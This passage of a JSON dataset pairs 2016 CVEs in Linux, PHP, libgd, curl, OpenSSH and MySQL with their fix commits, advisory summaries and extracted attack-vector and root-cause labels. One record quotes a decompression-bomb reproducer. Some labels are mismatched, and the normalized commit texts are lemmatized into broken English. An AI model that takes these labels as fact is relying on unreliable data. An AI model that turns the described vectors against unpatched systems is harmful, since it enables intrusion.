4.7.1 allows local users to gain privileges by leveraging the execution of a certain stop operation even if the corresponding start operation had failed.","commit_message_1":"fix use-after-free in seq file i got a kasan report of use-after-free : ================================================================== bug : kasan : use-after-free in klist_iter_exit+0x61\/0x70 at addr ffff8800b6581508 read of size <number> by task trinity-c1\/<number> ============================================================================= bug kmalloc-<number> ( not tainted ) : kasan : bad access detected -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - disabling lock debugging due to kernel taint info : allocated in disk_seqf_start+0x66\/0x110 age=<number> cpu=<number> pid=<number> ___slab_alloc+0x4f1\/0x520 <file>","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging the execution of a certain stop operation even if the corresponding start operation had failed","Impact":"gain privileges","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"40bec0f38f50e8510f5bb71a82f516d46facde03","cve_id":"CVE-2016-7568","cwe_id":"CWE-190","commit_message":"Merge branch 'pull-request\/296'","summary":"Integer overflow in the gdImageWebpCtx function in gd_webp.c in the GD Graphics Library (aka libgd) through 2.2.3, as used in PHP through 7.0.11, allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted imagewebp and imagedestroy calls.","commit_message_1":"merge branch 'pull-request\/<number> '","Vulnerability Type":"integer overflow","Attack Vector":"via crafted imagewebp and imagedestroy calls","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"7bc2b55a5c030685b399bb65b6baa9ccc3d1f167","cve_id":"CVE-2016-7425","cwe_id":"CWE-119","commit_message":"scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()\n\nWe need to put an upper bound on \"user_len\" so the memcpy() doesn't\noverflow.\n\nCc: <stable@vger.kernel.org>\nReported-by: Marco Grassi <marco.gra@gmail.com>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: Tomas Henzl <thenzl@redhat.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"The arcmsr_iop_message_xfer function in drivers\/scsi\/arcmsr\/arcmsr_hba.c in the Linux kernel through 4.8.2 does not restrict a certain length field, which allows local users to gain privileges or cause a denial of service (heap-based buffer overflow) via an ARCMSR_MESSAGE_WRITE_WQBUFFER control code.","commit_message_1":"arcmsr : buffer overflow in arcmsr_iop_message_xfer ( ) we need to put an upper bound on `` user_len '' so the memcpy ( ) doe n't overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via an arcmsr _ message _ write _ wqbuffer control code","Impact":"gain privileges or cause a denial of service ( heap - based buffer overflow )","Root Cause":"does not restrict a certain length field","Attack Type":"local attacker"},{"commit_id":"c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29?w=1","cve_id":"CVE-2016-7418","cwe_id":"CWE-119","commit_message":"Fix bug #73065: Out-Of-Bounds Read in php_wddx_push_element of wddx.c","summary":"The php_wddx_push_element function in ext\/wddx\/wddx.c in PHP before 5.6.26 and 7.x before 7.0.11 allows remote attackers to cause a denial of service (invalid pointer access and out-of-bounds read) or possibly have unspecified other impact via an incorrect boolean element in a wddxPacket XML document, leading to mishandling in a wddx_deserialize call.","commit_message_1":"fix bug # <number> : out-of-bounds read in php_wddx_push_element of <file>","Vulnerability Type":"buffer overflow","Attack Vector":"via an incorrect boolean element","Impact":"cause a denial of service (invalid pointer access and out-of-bounds read) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds memory read","Attack Type":"remote attacker"},{"commit_id":"ecb7f58a069be0dec4a6131b6351a761f808f22e?w=1","cve_id":"CVE-2016-7417","cwe_id":"CWE-20","commit_message":"Fix bug #73029 - Missing type check when unserializing SplArray","summary":"ext\/spl\/spl_array.c in PHP before 5.6.26 and 7.x before 7.0.11 proceeds with SplArray unserialization without validating a return value and data type, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted serialized data.","commit_message_1":"fix bug # <number> - missing type check when unserializing splarray","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted serialized data","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a memory corruption error","Attack Type":"remote attacker"},{"commit_id":"0bfb970f43acd1e81d11be1154805f86655f15d5?w=1","cve_id":"CVE-2016-7414","cwe_id":"CWE-119","commit_message":"Fix bug #72928 - Out of bound when verify signature of zip phar in phar_parse_zipfile\n\n(cherry picked from commit 19484ab77466f99c78fc0e677f7e03da0584d6a2)","summary":"The ZIP signature-verification feature in PHP before 5.6.26 and 7.x before 7.0.11 does not ensure that the uncompressed_filesize field is large enough, which allows remote attackers to cause a denial of service (out-of-bounds memory access) or possibly have unspecified other impact via a crafted PHAR archive, related to ext\/phar\/util.c and ext\/phar\/zip.c.","commit_message_1":"fix bug # <number> - out of bound when verify signature of zip phar in phar_parse_zipfile","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted phar archive with an alias mismatch","Impact":"cause a denial of service (out-of-bounds memory access) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds memory error","Attack Type":"remote attacker"},{"commit_id":"b88393f08a558eec14964a55d3c680fe67407712?w=1","cve_id":"CVE-2016-7413","cwe_id":"CWE-416","commit_message":"Fix bug #72860: wddx_deserialize use-after-free","summary":"Use-after-free vulnerability in the wddx_stack_destroy function in ext\/wddx\/wddx.c in PHP before 5.6.26 and 7.x before 7.0.11 allows remote attackers to cause a denial of service or possibly have unspecified other impact via a wddxPacket XML document that lacks an end-tag for a recordset field element, leading to mishandling in a wddx_deserialize call.","commit_message_1":"fix bug # <number> : wddx_deserialize use-after-free","Vulnerability Type":"Use After Free","Attack Vector":"via a wddxPacket XML document","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"28f80baf3c53e267c9ce46a2a0fadbb981585132?w=1","cve_id":"CVE-2016-7412","cwe_id":"CWE-119","commit_message":"Fix bug #72293 - Heap overflow in mysqlnd related to BIT fields","summary":"ext\/mysqlnd\/mysqlnd_wireprotocol.c in PHP before 5.6.26 and 7.x before 7.0.11 does not verify that a BIT field has the UNSIGNED_FLAG flag, which allows remote MySQL servers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted field metadata.","commit_message_1":"fix bug # <number> - heap overflow in mysqlnd related to bit field","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted field metadata","Impact":"cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking","Attack Type":"remote attacker"},{"commit_id":"6a7cc8ff85827fa9ac715b3a83c2d9147f33cd43?w=1","cve_id":"CVE-2016-7411","cwe_id":"CWE-119","commit_message":"Fix bug #73052 - Memory Corruption in During Deserialized-object Destruction","summary":"ext\/standard\/var_unserializer.re in PHP before 5.6.26 mishandles object-deserialization failures, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via an unserialize call that references a partially constructed object.","commit_message_1":"fix bug # <number> - memory corruption in during deserialized-object destruction","Vulnerability Type":"buffer overflow","Attack Vector":"via an unserialize call","Impact":"cause a denial of service (memory corruption) or possibly have unspecified other impact","Root Cause":"caused by a memory corruption error","Attack Type":"remote attacker"},{"commit_id":"6e06b1c89dd0d16f74894eac4cfc1327a06ee4a0","cve_id":"CVE-2016-7166","cwe_id":"CWE-399","commit_message":"Fix a potential crash issue discovered by Alexander Cherepanov:\n\nIt seems bsdtar automatically handles stacked compression. This is a\nnice feature but it could be problematic when it's completely\nunlimited.  Most clearly it's illustrated with quines:\n\n$ curl -sRO http:\/\/www.maximumcompression.com\/selfgz.gz\n$ (ulimit -v 10000000 && bsdtar -tvf selfgz.gz)\nbsdtar: Error opening archive: Can't allocate data for gzip decompression\n\nWithout ulimit, bsdtar will eat all available memory. This could also\nbe a problem for other applications using libarchive.","summary":"libarchive before 3.2.0 does not limit the number of recursive decompressions, which allows remote attackers to cause a denial of service (memory consumption and application crash) via a crafted gzip file.","commit_message_1":"fix a potential crash issue discovered by alexander cherepanov : it seems bsdtar automatically handle stacked compression","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted gzip file","Impact":"cause a denial of service ( memory consumption and application crash )","Root Cause":"does not limit the number of recursive decompressions","Attack Type":"remote attacker"},{"commit_id":"c16bc057ba3f125051c9966cf1f5b68a05681de4","cve_id":"CVE-2016-7163","cwe_id":"CWE-125","commit_message":"Fix an integer overflow issue (#809)\n\nPrevent an integer overflow issue in function opj_pi_create_decode of\npi.c.","summary":"Integer overflow in the opj_pi_create_decode function in pi.c in OpenJPEG allows remote attackers to execute arbitrary code via a crafted JP2 file, which triggers an out-of-bounds read or write.","commit_message_1":"fix an integer overflow issue ( # <number> ) prevent an integer overflow issue in function opj_pi_create_decode of <file>","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted jp2 file , which triggers an out - of - bounds read or write","Impact":"execute arbitrary code","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"818a3fda944b26d4814132cee14cfda4ea4aa824","cve_id":"CVE-2016-7143","cwe_id":"CWE-285","commit_message":"SASL: Disallow beginning : and space anywhere in AUTHENTICATE parameter\n\nThis is a FIX FOR A SECURITY VULNERABILITY. All Charybdis users must\napply this fix if you support SASL on your servers, or unload m_sasl.so\nin the meantime.","summary":"The m_authenticate function in modules\/m_sasl.c in Charybdis before 3.5.3 allows remote attackers to spoof certificate fingerprints and consequently log in as another user via a crafted AUTHENTICATE parameter.","commit_message_1":"disallow beginning : and space anywhere in authenticate parameter this is a fix for a security vulnerability","Vulnerability Type":"Improper Authorization","Attack Vector":"via a crafted authenticate parameter .","Impact":"spoof certificate fingerprints and consequently log in as another user","Root Cause":"caused by improper verification of certificates by the m_authenticate function","Attack Type":"remote attacker"},{"commit_id":"74fafb7f11b06747f69f182ad5e3769b665eea7a","cve_id":"CVE-2016-7142","cwe_id":"CWE-264","commit_message":"m_sasl: don't allow AUTHENTICATE with mechanisms with a space","summary":"The m_sasl module in InspIRCd before 2.0.23, when used with a service that supports SASL_EXTERNAL authentication, allows remote attackers to spoof certificate fingerprints and consequently log in as another user via a crafted SASL message.","commit_message_1":"m_sasl : do n't allow authenticate with mechanism with a space","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted sasl message","Impact":"spoof certificate fingerprints and consequently log in as another user","Root Cause":"with a service that supports sasl _ external authentication","Attack Type":"remote attacker"},{"commit_id":"curl-7_50_2~32","cve_id":"CVE-2016-7141","cwe_id":"CWE-287","commit_message":"nss: refuse previously loaded certificate from file\n\n... when we are not asked to use a certificate from file","summary":"curl and libcurl before 7.50.2, when built with NSS and the libnsspem.so library is available at runtime, allow remote attackers to hijack the authentication of a TLS connection by leveraging reuse of a previously loaded client certificate from file for a connection for which no certificate has been set, a different vulnerability than CVE-2016-5420.","commit_message_1":"refuse previously loaded certificate from file","Vulnerability Type":"Improper Authentication","Attack Vector":"by leveraging reuse of a previously loaded client certificate from file for a connection for which no certificate has been set , a different vulnerability than cve - 2016 - 5420 .","Impact":"bypass security restrictions","Root Cause":"caused by an implementation error of the NSS backend","Attack Type":"remote attacker"},{"commit_id":"c2a13ced4272f2e65d2773e2ea6ca11c1ce4a911?w=1","cve_id":"CVE-2016-7133","cwe_id":"CWE-190","commit_message":"Fix bug #72742 - memory allocator fails to realloc small block to large one","summary":"Zend\/zend_alloc.c in PHP 7.x before 7.0.10, when open_basedir is enabled, mishandles huge realloc operations, which allows remote attackers to cause a denial of service (integer overflow) or possibly have unspecified other impact via a long pathname.","commit_message_1":"fix bug # <number> - memory allocator fails to realloc small block to large one","Vulnerability Type":"integer overflow","Attack Vector":"via a long pathname","Impact":"cause a denial of service (integer overflow) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"a14fdb9746262549bbbb96abb87338bacd147e1b?w=1","cve_id":"CVE-2016-7132","cwe_id":"CWE-476","commit_message":"Fix for bug #72790 and bug #72799","summary":"ext\/wddx\/wddx.c in PHP before 5.6.25 and 7.x before 7.0.10 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) or possibly have unspecified other impact via an invalid wddxPacket XML document that is mishandled in a wddx_deserialize call, as demonstrated by a stray element inside a boolean element, leading to incorrect pop processing.","commit_message_1":"fix for bug # <number> and bug # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an invalid wddxPacket XML document","Impact":"cause a denial of service (NULL pointer dereference and application crash) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"698a691724c0a949295991e5df091ce16f899e02?w=1","cve_id":"CVE-2016-7130","cwe_id":"CWE-476","commit_message":"Fix bug #72750: wddx_deserialize null dereference","summary":"The php_wddx_pop_element function in ext\/wddx\/wddx.c in PHP before 5.6.25 and 7.x before 7.0.10 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) or possibly have unspecified other impact via an invalid base64 binary value, as demonstrated by a wddx_deserialize call that mishandles a binary element in a wddxPacket XML document.","commit_message_1":"fix bug # <number> : wddx_deserialize null dereference","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an invalid base64 binary value","Impact":"cause a denial of service (NULL pointer dereference and application crash) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"426aeb2808955ee3d3f52e0cfb102834cdb836a5?w=1","cve_id":"CVE-2016-7129","cwe_id":"CWE-20","commit_message":"Fix bug #72749: wddx_deserialize allows illegal memory access","summary":"The php_wddx_process_data function in ext\/wddx\/wddx.c in PHP before 5.6.25 and 7.x before 7.0.10 allows remote attackers to cause a denial of service (segmentation fault) or possibly have unspecified other impact via an invalid ISO 8601 time value, as demonstrated by a wddx_deserialize call that mishandles a dateTime element in a wddxPacket XML document.","commit_message_1":"fix bug # <number> : wddx_deserialize allows illegal memory access","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an invalid ISO 8601 time value","Impact":"cause a denial of service (segmentation fault) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"6dbb1ee46b5f4725cc6519abf91e512a2a10dfed?w=1","cve_id":"CVE-2016-7128","cwe_id":"CWE-200","commit_message":"Fixed bug #72627: Memory Leakage In exif_process_IFD_in_TIFF","summary":"The exif_process_IFD_in_TIFF function in ext\/exif\/exif.c in PHP before 5.6.25 and 7.x before 7.0.10 mishandles the case of a thumbnail offset that exceeds the file size, which allows remote attackers to obtain sensitive information from process memory via a crafted TIFF image.","commit_message_1":"fixed bug # <number> : memory leakage in exif_process_ifd_in_tiff","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted TIFF image","Impact":"obtain sensitive information","Root Cause":"caused by the improper handling of the case of a thumbnail offset","Attack Type":"remote attacker"},{"commit_id":"1bd103df00f49cf4d4ade2cfe3f456ac058a4eae?w=1","cve_id":"CVE-2016-7127","cwe_id":"CWE-787","commit_message":"Fix bug #72730 - imagegammacorrect allows arbitrary write access","summary":"The imagegammacorrect function in ext\/gd\/gd.c in PHP before 5.6.25 and 7.x before 7.0.10 does not properly validate gamma values, which allows remote attackers to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact by providing different signs for the second and third arguments.","commit_message_1":"fix bug # <number> - imagegammacorrect allows arbitrary write access","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"by providing different signs for the second and third arguments","Impact":"cause a denial of service (out-of-bounds write) or possibly have unspecified other impact","Root Cause":"caused by the failure to properly validate gamma values","Attack Type":"remote attacker"},{"commit_id":"8763c6090d627d8bb0ee1d030c30e58f406be9ce?w=1","cve_id":"CVE-2016-7125","cwe_id":"CWE-74","commit_message":"Fix bug #72681 - consume data even if we're not storing them","summary":"ext\/session\/session.c in PHP before 5.6.25 and 7.x before 7.0.10 skips invalid session names in a way that triggers incorrect parsing, which allows remote attackers to inject arbitrary-type session data by leveraging control of a session name, as demonstrated by object injection.","commit_message_1":"fix bug # <number> - consume data even if we 're not storing them","Vulnerability Type":"Injection","Attack Vector":"by leveraging control of a session name","Impact":"inject arbitrary-type session data","Root Cause":"caused by the skipping of invalid session names","Attack Type":"remote attacker"},{"commit_id":"20ce2fe8e3c211a42fee05a461a5881be9a8790e?w=1","cve_id":"CVE-2016-7124","cwe_id":"CWE-502","commit_message":"Fix bug #72663 - destroy broken object when unserializing\n\n(cherry picked from commit 448c9be157f4147e121f1a2a524536c75c9c6059)","summary":"ext\/standard\/var_unserializer.c in PHP before 5.6.25 and 7.x before 7.0.10 mishandles certain invalid objects, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted serialized data that leads to a (1) __destruct call or (2) magic method call.","commit_message_1":"fix bug # <number> - destroy broken object when unserializing","Vulnerability Type":"Path Equivalence","Attack Vector":"via crafted serialized data","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by the improper handling of invalid objects","Attack Type":"remote attacker"},{"commit_id":"34b88a68f26a75e4fded796f1a49c40f82234b7d","cve_id":"CVE-2016-7117","cwe_id":"CWE-19","commit_message":"net: Fix use after free in the recvmmsg exit path\n\nThe syzkaller fuzzer hit the following use-after-free:\n\n  Call Trace:\n   [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e\/0x40 mm\/kasan\/report.c:295\n   [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa\/0x7f0 net\/socket.c:2261\n   [<     inline     >] SYSC_recvmmsg net\/socket.c:2281\n   [<ffffffff851cc57f>] SyS_recvmmsg+0x16f\/0x180 net\/socket.c:2270\n   [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16\/0x7a\n  arch\/x86\/entry\/entry_64.S:185\n\nAnd, as Dmitry rightly assessed, that is because we can drop the\nreference and then touch it when the underlying recvmsg calls return\nsome packets and then hit an error, which will make recvmmsg to set\nsock->sk->sk_err, oops, fix it.\n\nReported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: Alexander Potapenko <glider@google.com>\nCc: Eric Dumazet <edumazet@google.com>\nCc: Kostya Serebryany <kcc@google.com>\nCc: Sasha Levin <sasha.levin@oracle.com>\nFixes: a2e2725541fa (\"net: Introduce recvmmsg socket syscall\")\nhttp:\/\/lkml.kernel.org\/r\/20160122211644.GC2470@redhat.com\nSigned-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Use-after-free vulnerability in the __sys_recvmmsg function in net\/socket.c in the Linux kernel before 4.5.2 allows remote attackers to execute arbitrary code via vectors involving a recvmmsg system call that is mishandled during error processing.","commit_message_1":"fix use after free in the recvmmsg exit path the syzkaller fuzzer hit the following use-after-free : call trace : [ < ffffffff8175ea0e > ] __asan_report_load8_noabort+0x3e\/0x40 mm\/kasan\/<file> : <number> [ < ffffffff851cc31a > ] __sys_recvmmsg+0x6fa\/0x7f0 net\/<file> : <number> [ < inline > ] sysc_recvmmsg net\/<file> : <number> [ < ffffffff851cc57f > ] sys_recvmmsg+0x16f\/0x180 net\/<file> : <number> [ < ffffffff86332bb6 > ] entry_syscall_64_fastpath+0x16\/0x7a arch\/x86\/entry\/<file> : <number> and , a dmitry rightly assessed , that is because we can drop the reference and then touch it when the underlying recvmsg call return some packet and then hit an error , which will make recvmmsg to set sock- > sk- > sk_err , oops , fix it","Vulnerability Type":"Data Processing Errors","Attack Vector":"via vectors involving a recvmmsg system call that is mishandled during error processing .","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"b69d11727d4f0f8cf719c79e3fb700f55ca03e9a","cve_id":"CVE-2016-7115","cwe_id":"CWE-119","commit_message":"Merge pull request #20 from eyalitki\/master\n\n2nd round security fixes from eyalitki","summary":"Buffer overflow in the handle_packet function in mactelnet.c in the client in MAC-Telnet 0.4.3 and earlier allows remote TELNET servers to execute arbitrary code via a long string in an MT_CPTYPE_PASSSALT control packet.","commit_message_1":"merge pull request # <number> from eyalitki\/master","Vulnerability Type":"buffer overflow","Attack Vector":"via a long string in an mt _ cptype _ passsalt control packet","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the handle_packet function","Attack Type":"remote attacker"},{"commit_id":"073931017b49d9458aa351605b43a7e34598caef","cve_id":"CVE-2016-7097","cwe_id":"CWE-285","commit_message":"posix_acl: Clear SGID bit when setting file permissions\n\nWhen file permissions are modified via chmod(2) and the user is not in\nthe owning group or capable of CAP_FSETID, the setgid bit is cleared in\ninode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file\npermissions as well as the new ACL, but doesn't clear the setgid bit in\na similar way; this allows to bypass the check in chmod(2).  Fix that.\n\nReferences: CVE-2016-7097\nReviewed-by: Christoph Hellwig <hch@lst.de>\nReviewed-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Jan Kara <jack@suse.cz>\nSigned-off-by: Andreas Gruenbacher <agruenba@redhat.com>","summary":"The filesystem implementation in the Linux kernel through 4.8.2 preserves the setgid bit during a setxattr call, which allows local users to gain group privileges by leveraging the existence of a setgid program with restrictions on execute permissions.","commit_message_1":"clear sgid bit when setting file permission when file permission are modified via chmod ( <number> ) and the user is not in the owning group or capable of cap_fsetid , the setgid bit is cleared in inode_change_ok ( )","Vulnerability Type":"Improper Authorization","Attack Vector":"by leveraging the existence of a setgid program with restrictions on execute permissions .","Impact":"gain group privileges","Root Cause":"caused by the setgid bit being preserved during a setxattr call by the filesystem implementation","Attack Type":"local attacker"},{"commit_id":"01c61f8ab110a77ae64b5ca67c244c728c506f03","cve_id":"CVE-2016-6905","cwe_id":"CWE-125","commit_message":"Proper fix for #248","summary":"The read_image_tga function in gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.3 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA image.","commit_message_1":"proper fix for # <number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tga image","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"bb1fceca22492109be12640d49f5ea5a544c6bb4","cve_id":"CVE-2016-6828","cwe_id":"CWE-416","commit_message":"tcp: fix use after free in tcp_xmit_retransmit_queue()\n\nWhen tcp_sendmsg() allocates a fresh and empty skb, it puts it at the\ntail of the write queue using tcp_add_write_queue_tail()\n\nThen it attempts to copy user data into this fresh skb.\n\nIf the copy fails, we undo the work and remove the fresh skb.\n\nUnfortunately, this undo lacks the change done to tp->highest_sack and\nwe can leave a dangling pointer (to a freed skb)\n\nLater, tcp_xmit_retransmit_queue() can dereference this pointer and\naccess freed memory. For regular kernels where memory is not unmapped,\nthis might cause SACK bugs because tcp_highest_sack_seq() is buggy,\nreturning garbage instead of tp->snd_nxt, but with various debug\nfeatures like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.\n\nThis bug was found by Marco Grassi thanks to syzkaller.\n\nFixes: 6859d49475d4 (\"[TCP]: Abstract tp->highest_sack accessing & point to next skb\")\nReported-by: Marco Grassi <marco.gra@gmail.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nCc: Ilpo J\u00e4rvinen <ilpo.jarvinen@helsinki.fi>\nCc: Yuchung Cheng <ycheng@google.com>\nCc: Neal Cardwell <ncardwell@google.com>\nAcked-by: Neal Cardwell <ncardwell@google.com>\nReviewed-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_check_send_head function in include\/net\/tcp.h in the Linux kernel before 4.7.5 does not properly maintain certain SACK state after a failed data copy, which allows local users to cause a denial of service (tcp_xmit_retransmit_queue use-after-free and system crash) via a crafted SACK option.","commit_message_1":"fix use after free in tcp_xmit_retransmit_queue ( ) when tcp_sendmsg ( ) allocates a fresh and empty skb , it put it at the tail of the write queue using tcp_add_write_queue_tail ( ) then it attempt to copy user data into this fresh skb","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted sack option","Impact":"cause a denial of service ( tcp _ xmit _ retransmit _ queue use - after - free and system crash )","Root Cause":"does not properly maintain certain sack state after a failed data copy","Attack Type":"local attacker"},{"commit_id":"f63a8daa5812afef4f06c962351687e1ff9ccb2b","cve_id":"CVE-2016-6787","cwe_id":"CWE-264","commit_message":"perf: Fix event->ctx locking\n\nThere have been a few reported issues wrt. the lack of locking around\nchanging event->ctx. This patch tries to address those.\n\nIt avoids the whole rwsem thing; and while it appears to work, please\ngive it some thought in review.\n\nWhat I did fail at is sensible runtime checks on the use of\nevent->ctx, the RCU use makes it very hard.\n\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: Paul E. McKenney <paulmck@linux.vnet.ibm.com>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Arnaldo Carvalho de Melo <acme@kernel.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nLink: http:\/\/lkml.kernel.org\/r\/20150123125834.209535886@infradead.org\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"kernel\/events\/core.c in the performance subsystem in the Linux kernel before 4.0 mismanages locks during certain migrations, which allows local users to gain privileges via a crafted application, aka Android internal bug 31095224.","commit_message_1":"fix event- > ctx locking there have been a few reported issue wrt","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application , aka android internal bug 31095224","Impact":"gain privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"347eeefbfc658c8531878218487d729f4e020805","cve_id":"CVE-2016-6663","cwe_id":"CWE-362","commit_message":"don't use my_copystat in the server\n\nit was supposed to be used in command-line tools only.\nDifferent fix for 4e5473862e:\n\nBug#24388746: PRIVILEGE ESCALATION AND RACE CONDITION USING CREATE TABLE","summary":"Race condition in Oracle MySQL before 5.5.52, 5.6.x before 5.6.33, 5.7.x before 5.7.15, and 8.x before 8.0.1; MariaDB before 5.5.52, 10.0.x before 10.0.28, and 10.1.x before 10.1.18; Percona Server before 5.5.51-38.2, 5.6.x before 5.6.32-78-1, and 5.7.x before 5.7.14-8; and Percona XtraDB Cluster before 5.5.41-37.0, 5.6.x before 5.6.32-25.17, and 5.7.x before 5.7.14-26.17 allows local users with certain permissions to gain privileges by leveraging use of my_copystat by REPAIR TABLE to repair a MyISAM table.","commit_message_1":"do n't use my_copystat in the server it wa supposed to be used in command-line tool only","Vulnerability Type":"Race Condition","Attack Vector":"by REPAIR TABLE to repair a MyISAM table","Impact":"gain elevated privileges","Root Cause":"caused by a race condition error while setting stats during MyISAM table repair","Attack Type":"local attacker"},{"commit_id":"76401e172ea3a55182be2b8e2aca4d07270f6da6","cve_id":"CVE-2016-6520","cwe_id":"CWE-125","commit_message":"Evaluate lazy pixel cache morphology to prevent buffer overflow (bug report from Ibrahim M. El-Sayed)","summary":"Buffer overflow in MagickCore\/enhance.c in ImageMagick before 7.0.2-7 allows remote attackers to have unspecified impact via vectors related to pixel cache morphology.","commit_message_1":"evaluate lazy pixel cache morphology to prevent buffer overflow ( bug report from ibrahim m","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to pixel cache morphology","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by ContrastStretchImage()","Attack Type":"remote attacker"},{"commit_id":"10eec60ce79187686e052092e5383c99b4420a20","cve_id":"CVE-2016-6516","cwe_id":"CWE-119","commit_message":"vfs: ioctl: prevent double-fetch in dedupe ioctl\n\nThis prevents a double-fetch from user space that can lead to to an\nundersized allocation and heap overflow.\n\nFixes: 54dbc1517237 (\"vfs: hoist the btrfs deduplication ioctl to the vfs\")\nSigned-off-by: Scott Bauer <sbauer@plzdonthack.me>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Race condition in the ioctl_file_dedupe_range function in fs\/ioctl.c in the Linux kernel through 4.7 allows local users to cause a denial of service (heap-based buffer overflow) or possibly gain privileges by changing a certain count value, aka a *double fetch* vulnerability.","commit_message_1":"ioctl : prevent double-fetch in dedupe ioctl this prevents a double-fetch from user space that can lead to to an undersized allocation and heap overflow","Vulnerability Type":"buffer overflow","Attack Vector":"by changing a certain count value , aka a * double fetch * vulnerability","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly gain privileges","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"fcd135c9df440bcd2d5870405ad3311743d78d97","cve_id":"CVE-2016-6515","cwe_id":"CWE-20","commit_message":"upstream commit\n\nSkip passwords longer than 1k in length so clients can't\neasily DoS sshd by sending very long passwords, causing it to spend CPU\nhashing them. feedback djm@, ok markus@.\n\nBrought to our attention by tomas.kuthan at oracle.com, shilei-c at\n360.cn and coredump at autistici.org\n\nUpstream-ID: d0af7d4a2190b63ba1d38eec502bc4be0be9e333","summary":"The auth_password function in auth-passwd.c in sshd in OpenSSH before 7.3 does not limit password lengths for password authentication, which allows remote attackers to cause a denial of service (crypt CPU consumption) via a long string.","commit_message_1":"upstream commit skip password longer than 1k in length so client can't easily do sshd by sending very long password , causing it to spend cpu hashing them","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a long string","Impact":"cause a denial of service ( crypt cpu consumption )","Root Cause":"does not limit password lengths for password authentication","Attack Type":"remote attacker"},{"commit_id":"035cf2afc04988b22cb67f4ebfd77e9b344cb6e0","cve_id":"CVE-2016-6494","cwe_id":"CWE-200","commit_message":"SERVER-25335 avoid group and other permissions when creating .dbshell history file","summary":"The client in MongoDB uses world-readable permissions on .dbshell history files, which might allow local users to obtain sensitive information by reading these files.","commit_message_1":"server-<number> avoid group and other permission when creating","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading these files","Impact":"obtain sensitive information","Root Cause":"uses world - readable permissions","Attack Type":"local 